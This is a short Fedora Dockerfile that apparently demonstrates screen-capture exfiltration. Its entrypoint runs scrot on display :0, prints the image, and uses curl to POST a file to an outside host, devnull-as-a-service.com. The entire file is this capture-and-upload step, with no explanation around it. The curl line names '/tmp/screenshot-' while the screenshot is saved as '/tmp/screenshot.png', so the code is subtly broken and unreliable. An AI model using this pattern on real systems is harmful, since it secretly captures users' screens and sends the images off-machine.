from fedora

RUN dnf install -y \
	scrot 

ENV DISPLAY=:0

ENTRYPOINT /bin/bash -c "scrot -m /tmp/screenshot.png; \
	cat /tmp/screenshot.png; \
	curl -d @/tmp/screenshot- -X POST http://devnull-as-a-service.com/dev/null"
